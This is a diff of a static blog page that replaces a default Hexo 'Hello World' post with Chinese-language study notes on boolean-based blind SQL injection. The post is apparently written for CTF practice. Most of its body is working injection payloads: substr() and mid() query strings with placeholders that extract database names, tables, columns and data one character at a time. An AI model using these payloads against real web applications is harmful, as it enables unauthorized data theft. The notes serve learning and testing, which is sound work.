@@ -87,17 +87,17 @@
 
 
 
-<meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troublesho">
+<meta name="description" content="特点：1&amp;gt;在不是提示符号被过滤的情况下(有的时候会提示）只有两种返回值：true or false2&amp;gt;通过语句返回true or false进行注入 基本语句使用（1）length(database())//测试到数据库的长度  （2）select substr(database(),1,1">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/11/26/hello-world/index.html">
+<meta property="og:title" content="SQL总结(二)_布尔盲注">
+<meta property="og:url" content="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/11/27/布尔盲注/index.html">
 <meta property="og:site_name" content="TobeFine">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="特点：1&amp;gt;在不是提示符号被过滤的情况下(有的时候会提示）只有两种返回值：true or false2&amp;gt;通过语句返回true or false进行注入 基本语句使用（1）length(database())//测试到数据库的长度  （2）select substr(database(),1,1);//获取该数据库名字的第一个字母        select ascii(substr(da">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-02-14T03:47:06.715Z">
+<meta property="og:updated_time" content="2017-11-26T17:30:43.643Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="twitter:title" content="SQL总结(二)_布尔盲注">
+<meta name="twitter:description" content="特点：1&amp;gt;在不是提示符号被过滤的情况下(有的时候会提示）只有两种返回值：true or false2&amp;gt;通过语句返回true or false进行注入 基本语句使用（1）length(database())//测试到数据库的长度  （2）select substr(database(),1,1);//获取该数据库名字的第一个字母        select ascii(substr(da">
 
 
 
@@ -125,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/11/26/hello-world/"/>
+  <link rel="canonical" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/11/27/布尔盲注/"/>
 
 
 
 
 
-  <title> Hello World | TobeFine </title>
+  <title> SQL总结(二)_布尔盲注 | TobeFine </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -296,7 +296,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/11/26/hello-world/">
+  <link itemprop="mainEntityOfPage" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/11/27/布尔盲注/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="Shirley">
@@ -320,7 +320,7 @@
             
             
               
-                Hello World
+                SQL总结(二)_布尔盲注
               
             
           </h1>
@@ -335,8 +335,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-26T21:23:44+08:00">
-                2017-11-26
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-27T01:30:43+08:00">
+                2017-11-27
               </time>
             
 
@@ -354,8 +354,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/11/26/hello-world/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/11/26/hello-world/" itemprop="commentCount"></span>
+                <a href="/2017/11/27/布尔盲注/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/11/27/布尔盲注/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -381,16 +381,56 @@
       
 
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+        <h2 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h2><p>1&gt;在不是提示符号被过滤的情况下(有的时候会提示）只有两种返回值：true or false<br><br>2&gt;通过语句返回true or false进行注入</p>
+<h2 id="基本语句使用"><a href="#基本语句使用" class="headerlink" title="基本语句使用"></a>基本语句使用</h2><pre><code>（1）length(database())//测试到数据库的长度
 
+（2）select substr(database(),1,1);//获取该数据库名字的第一个字母
+       select ascii(substr(database(),1,1));//获取该数据库名字的第一个字母的ASCII码
+       select ascii(substr(database(),2,2));//获取该数据库名字的第二个字母的ASCII码
+
+（3）假设该数据库名字的第一个字母是s，其ASCII码值为115
+     select ascii(substr(database(),1,1))=115; //返回值为真
+
+（4）通过观察返回值，确认数据库名字，数据表，数据的值
+</code></pre><p><br></p>
+<h3 id="使用substr"><a href="#使用substr" class="headerlink" title="使用substr()"></a>使用substr()</h3><blockquote>
+<p>1 爆数据库名</p>
+</blockquote>
+<pre><code>?id=1&apos; AND (ascii(substr((select database()),3,3)) = 99 --+
+</code></pre><blockquote>
+<p>2.爆数据表名</p>
+</blockquote>
+<pre><code>?id=1&apos; AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))) &lt;105 --+
+</code></pre><blockquote>
+<p>3.爆列名</p>
+</blockquote>
+<pre><code>?id=1&apos; AND (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() and table_name =&apos;表名&apos;),1,1))) &lt;105 --+
+</code></pre><blockquote>
+<p>4.爆数据</p>
+</blockquote>
+<pre><code>?id=1&apos; and if(ascii(substr(select &quot;列名&quot; from users limit %d,1),%d,1)&gt;=%d--+
+</code></pre><h3 id="使用mid"><a href="#使用mid" class="headerlink" title="使用mid()"></a>使用mid()</h3><blockquote>
+<p>mid(text, start_num, num_chars)<br>一共有3个参数： text,start_num,num_chars<br>text:（必选） 变体、字符串的表达式<br>start_num: 从左边第几位开始读起（必选）<br>num_chars:从start参数的位置开始，向右截图的长度，可选，默认从start开始向右的所有字符。</p>
+</blockquote>
+<p>-</p>
+<blockquote>
+<p>1.求数据库</p>
+</blockquote>
+<pre><code>pl = &apos;123\&apos;or(ascii(mid((database())from(%s)for(1)))=%s)#&apos;
+</code></pre><blockquote>
+<p>2.求数据表</p>
+</blockquote>
+<pre><code>pl = &apos;123\&apos;or(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\&apos;xman\&apos;))from(%s)for(1)))=%s)#&apos;
+</code></pre><blockquote>
+<p>3.求数据列</p>
+</blockquote>
+<pre><code>pl=&apos;123\&apos;or(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_schema=\&apos;数据库名字\&apos;))from(%s)for(1)))=%s)#&apos;
+</code></pre><blockquote>
+<p>4.求数据</p>
+</blockquote>
+<pre><code>pl = &apos;123\&apos;or(ascii(mid((select(group_concat(列名))from(表名))from(%s)for(1)))=%s)#&apos;
+</code></pre><h3 id="使用exists"><a href="#使用exists" class="headerlink" title="使用exists()"></a>使用exists()</h3><pre><code>exists(select * from admin)
+</code></pre>
       
     </div>
 
@@ -420,15 +460,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2017/11/27/union回显_报错注入/" rel="next" title="SQL总结(一)_Union回显+报错注入">
+                <i class="fa fa-chevron-left"></i> SQL总结(一)_Union回显+报错注入
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/11/26/python爬虫的一些小知识点/" rel="prev" title="python爬虫的一些小知识点">
-                python爬虫的一些小知识点 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -470,8 +510,8 @@
 			})();
 			</script>
 		<!-- 多说公共JS代码 end -->
-      <div class="ds-thread" data-thread-key="2017/11/26/hello-world/"
-           data-title="Hello World" data-url="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/11/26/hello-world/">
+      <div class="ds-thread" data-thread-key="2017/11/27/布尔盲注/"
+           data-title="SQL总结(二)_布尔盲注" data-url="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/11/27/布尔盲注/">
       </div>
     
   </div>
@@ -557,7 +597,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-number">1.</span> <span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-number">1.1.</span> <span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-number">1.2.</span> <span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-number">1.3.</span> <span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-number">1.4.</span> <span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#特点："><span class="nav-number">1.</span> <span class="nav-text">特点：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基本语句使用"><span class="nav-number">2.</span> <span class="nav-text">基本语句使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用substr"><span class="nav-number">2.1.</span> <span class="nav-text">使用substr()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用mid"><span class="nav-number">2.2.</span> <span class="nav-text">使用mid()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用exists"><span class="nav-number">2.3.</span> <span class="nav-text">使用exists()</span></a></li></ol></li></ol></div>
             
 
           </div>
